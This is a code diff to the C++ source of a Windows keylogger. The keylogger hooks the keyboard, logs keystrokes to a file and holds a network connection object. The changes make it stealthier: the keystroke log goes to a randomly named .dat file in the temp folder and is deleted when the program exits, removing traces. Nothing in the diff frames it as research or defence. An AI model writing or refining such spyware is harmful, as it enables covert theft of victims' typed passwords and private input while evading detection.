@@ -1,4 +1,5 @@
 #include <Windows.h>
+#include <wchar.h>
 #include "keylogger.h"
 
 Keylogger* currentKeyloggerObj = NULL;
@@ -65,10 +66,14 @@ LRESULT OurKeyBoardProc(Keylogger* KeyloggerObj, int nCode, WPARAM wparam, LPARA
 	return CallNextHookEx(KeyloggerObj->eHook, nCode, wparam, lparam);
 }
 
-Keylogger::Keylogger(Connection* mConnObj, WCHAR* mlogPath)
+Keylogger::Keylogger(Connection* mConnObj)
 {
 	ConnObj = mConnObj;
+	WCHAR mlogPath[200];
+	swprintf(mlogPath, L"%Temp%\\%x.dat", GetTickCount() ^ GetCurrentProcessId());
 	ExpandEnvironmentStrings(mlogPath, logPath, MAX_PATH);
+	hLog = NULL;
+	eHook = NULL;
 }
 
 Keylogger::~Keylogger(){}
@@ -121,6 +126,11 @@ bool Keylogger::CloseLog()
 		hLog = NULL;
 	}
 	return ret;
+}
+
+bool Keylogger::DeleteLog()
+{
+	return DeleteFile(this->logPath);
 }
 
 bool Keylogger::InstallHook()
@@ -213,6 +223,7 @@ void Keylogger::OnPacketArrived(BYTE* PacketData, size_t Size)
 
 void Keylogger::OnExit()
 {
-	CloseLog();
 	UnInstallHook();
+	CloseLog();
+	DeleteLog();
 }
